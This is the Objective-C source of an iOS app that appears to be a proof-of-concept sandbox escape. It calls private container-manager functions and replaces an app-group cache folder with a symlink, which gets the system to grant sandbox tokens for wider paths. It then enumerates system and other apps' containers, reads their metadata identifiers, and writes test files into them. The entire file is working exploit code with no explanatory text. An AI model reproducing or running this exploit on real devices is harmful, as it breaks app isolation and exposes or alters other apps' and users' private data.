// META — enumerate system/app-group containers, read metadata identifiers, sweep wider parents
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <dirent.h>
#import <unistd.h>
#import <errno.h>
#import <sys/stat.h>
#import <string.h>
typedef void *(*fn_create)(void);
typedef void (*fn_set_u64)(void *, uint64_t);
typedef void (*fn_set_obj)(void *, void *);
typedef void *(*fn_get_one)(void *);
typedef char *(*fn_copy_token)(void *);
typedef const char *(*fn_get_path)(void *);
typedef void (*fn_free)(void *);
typedef int64_t (*fn_consume)(const char *);
typedef int64_t (*fn_release)(int64_t);
typedef void *(*fn_xpc_string)(const char *);
typedef void (*fn_xpc_release)(void *);
static fn_create q_create; static fn_set_u64 q_class,q_part,q_flags; static fn_set_obj q_group;
static fn_get_one q_get; static fn_copy_token q_token; static fn_get_path q_path; static fn_free q_free;
static fn_consume s_consume; static fn_release s_release; static fn_xpc_string xpc_string; static fn_xpc_release xpc_release_fn;
static NSMutableString *gLog; static NSString *gPath; static NSString *gGroup,*gPart,*gValid,*gRoot;
static void L(NSString *fmt, ...){va_list ap;va_start(ap,fmt);NSString*s=[[NSString alloc]initWithFormat:fmt arguments:ap];va_end(ap);[gLog appendString:s];[gLog appendString:@"\n"];[gLog writeToFile:gPath atomically:YES encoding:NSUTF8StringEncoding error:nil];NSLog(@"[meta] %@",s);}
static BOOL loadMCM(void){void*h=dlopen("/usr/lib/system/libsystem_containermanager.dylib",RTLD_NOW|RTLD_LOCAL);if(!h)return NO;q_create=dlsym(h,"container_query_create");q_class=dlsym(h,"container_query_set_class");q_group=dlsym(h,"container_query_set_group_identifiers");q_part=dlsym(h,"container_query_operation_set_part");q_flags=dlsym(h,"container_query_operation_set_flags");q_get=dlsym(h,"container_query_get_single_result");q_token=dlsym(h,"container_copy_sandbox_token");q_path=dlsym(h,"container_object_get_path");q_free=dlsym(h,"container_query_free");s_consume=dlsym(RTLD_DEFAULT,"sandbox_extension_consume");s_release=dlsym(RTLD_DEFAULT,"sandbox_extension_release");xpc_string=dlsym(RTLD_DEFAULT,"xpc_string_create");xpc_release_fn=dlsym(RTLD_DEFAULT,"xpc_release");return q_create&&q_get&&q_token&&s_consume;}
static NSString *findGroup(void){NSArray*ids=@[@"group.8e0bc870a21520b9.1",@"group.8e0bc870a21520b9.4",@"group.8e0bc870a21520b9.5",@"group.8e0bc870a21520b9.3",@"group.8e0bc870a21520b9.2"];for(NSString*g in ids){NSURL*u=[[NSFileManager defaultManager]containerURLForSecurityApplicationGroupIdentifier:g];if(u.path.length)return g;}return nil;}
static int64_t query(NSString**pathOut){void*q=q_create();q_class(q,7);void*x=xpc_string?xpc_string(gGroup.UTF8String):NULL;q_group(q,x);q_part(q,3);q_flags(q,0x8000000000ULL);void*res=q_get(q);const char*p=(res&&q_path)?q_path(res):NULL;char*tok=(res&&q_token)?q_token(res):NULL;int64_t h=(tok&&s_consume)?s_consume(tok):-5;if(pathOut)*pathOut=p?[NSString stringWithUTF8String:p]:nil;if(tok)free(tok);if(q_free)q_free(q);if(x&&xpc_release_fn)xpc_release_fn(x);return h;}
static NSString *metaId(NSString*child){NSString*p=[child stringByAppendingPathComponent:@".com.apple.mobile_container_manager.metadata.plist"];NSData*d=[NSData dataWithContentsOfFile:p];if(!d)return @"-";NSDictionary*dict=[NSPropertyListSerialization propertyListWithData:d options:0 format:NULL error:NULL];if(![dict isKindOfClass:[NSDictionary class]])return @"?";id v=dict[@"MCMMetadataIdentifier"];return [v isKindOfClass:[NSString class]]?v:@"?";}
static void tw(NSString*tag,NSString*path){errno=0;int fd=open(path.fileSystemRepresentation,O_CREAT|O_WRONLY|O_TRUNC,0644);int e=errno;if(fd>=0){write(fd,"META",4);close(fd);L(@"[WIN %@] %@",tag,path);}else L(@"[w %@] errno=%d",tag,e);}
static void enumContainer(NSString*tag,NSString*root,int maxn){errno=0;DIR*d=opendir(root.fileSystemRepresentation);if(!d){L(@"[enum %@] opendir errno=%d",tag,errno);return;}DIR*dd=opendir(root.fileSystemRepresentation);struct dirent*de;int n=0;NSMutableArray*arr=[NSMutableArray array];while((de=readdir(dd))&&n<maxn){NSString*nm=[NSString stringWithUTF8String:de->d_name];if(nm&&![nm hasPrefix:@"."]){[arr addObject:nm];n++;}}closedir(dd);closedir(d);L(@"[enum %@] count~=%d",tag,(int)arr.count);for(NSString*nm in arr){NSString*child=[root stringByAppendingPathComponent:nm];struct stat st;if(lstat(child.fileSystemRepresentation,&st)!=0)continue;if(!S_ISDIR(st.st_mode))continue;NSString*m=metaId(child);L(@"[meta %@] %@ = %@",tag,nm,m);}}
static void sweep(NSArray*cands){int i=0;for(NSString*c in cands){i++;NSFileManager*fm=[NSFileManager defaultManager];[fm removeItemAtPath:gPart error:nil];symlink(c.fileSystemRepresentation,gPart.fileSystemRepresentation);NSString*p=nil;int64_t h=query(&p);L(@"[sweep %d] %@ token=%lld path=%@",i,c,(long long)h,p?:@"(null)");if(h>=0){errno=0;DIR*d=opendir(c.fileSystemRepresentation);L(@"[sweep %d] opendir=%p errno=%d",i,d,errno);if(d){int n=0;struct dirent*de;NSMutableArray*names=[NSMutableArray array];while((de=readdir(d))&&n<5){NSString*nm=[NSString stringWithUTF8String:de->d_name];if(nm&&![nm hasPrefix:@"."]){n++;[names addObject:nm];}}closedir(d);L(@"[sweep %d] entries=%@",i,[names componentsJoinedByString:@","]);NSString*fc=names.count?[c stringByAppendingPathComponent:names[0]]:nil;if(fc)tw([NSString stringWithFormat:@"sw%d",i],[fc stringByAppendingPathComponent:@"omni_meta_test"]);}if(s_release)s_release(h);}}}
static void run(void){@autoreleasepool{
 L(@"=== meta start uid=%d pid=%d",getuid(),getpid()); if(!loadMCM())return;
 gGroup=findGroup(); if(!gGroup){L(@"no group");return;}
 gRoot=[[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:gGroup].path;
 gPart=[gRoot stringByAppendingPathComponent:@"Library/Caches"];
 gValid=@"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";
 NSFileManager*fm=[NSFileManager defaultManager];[fm createDirectoryAtPath:[gPart stringByDeletingLastPathComponent] withIntermediateDirectories:YES attributes:nil error:nil];
 NSArray*metaRoots=@[@"/private/var/containers/Data/System",@"/private/var/mobile/Containers/Shared/AppGroup"];
 for(NSString*r in metaRoots){[fm removeItemAtPath:gPart error:nil];symlink(r.fileSystemRepresentation,gPart.fileSystemRepresentation);NSString*p=nil;int64_t h=query(&p);L(@"[meta-root] %@ token=%lld",r,(long long)h);if(h>=0){enumContainer([r lastPathComponent],r,60);if(s_release)s_release(h);}}
 NSArray*cands=@[@"/private/var/containers/Data",@"/private/var/containers",@"/private/var",@"/private/var/mobile/Containers/Data",@"/private/var/mobile/Containers",@"/private/var/mobile/Containers/Data/Application/..",@"/private/var/containers/Data/System/..",@"/private/var/containers/Data/System/../..",@"/private/var/containers/Data/System/../../..",@"/private/var/containers/Data/System/../../mobile/Containers/Data",@"/private/var/containers/Data/System/../../mobile/Containers/Data/Application",@"/private/var/containers/Data/System/../../mobile/Library",@"/private/var/mobile/Containers/Shared/AppGroup/../Data",@"/private/var/mobile/Containers/Data/Application/../../Library",@"/private/var/mobile/Containers/Shared/AppGroup/../AppGroup/.."];
 sweep(cands);
 [fm removeItemAtPath:gPart error:nil];symlink(gValid.fileSystemRepresentation,gPart.fileSystemRepresentation);
 L(@"=== meta done ===");
}}
@interface AppDelegate:UIResponder<UIApplicationDelegate>@property(strong,nonatomic)UIWindow*window;@end
@implementation AppDelegate
- (BOOL)application:(UIApplication*)app didFinishLaunchingWithOptions:(NSDictionary*)opts{self.window=[[UIWindow alloc]initWithFrame:[UIScreen mainScreen].bounds];UIViewController*vc=[UIViewController new];vc.view.backgroundColor=UIColor.blackColor;UITextView*tv=[[UITextView alloc]initWithFrame:vc.view.bounds];tv.backgroundColor=UIColor.blackColor;tv.textColor=UIColor.greenColor;tv.font=[UIFont monospacedSystemFontOfSize:9 weight:UIFontWeightRegular];tv.editable=NO;tv.text=@"META";[vc.view addSubview:tv];self.window.rootViewController=vc;[self.window makeKeyAndVisible];[UIApplication sharedApplication].idleTimerDisabled=YES;NSString*docs=[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask,YES)firstObject];gPath=[[docs stringByAppendingPathComponent:@"meta.log"]copy];gLog=[NSMutableString new];L(@"=== meta launch ===");dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED,0),^{run();dispatch_async(dispatch_get_main_queue(),^{tv.text=gLog;});});return YES;}
@end
int main(int argc,char**argv){@autoreleasepool{return UIApplicationMain(argc,argv,nil,NSStringFromClass([AppDelegate class]));}}
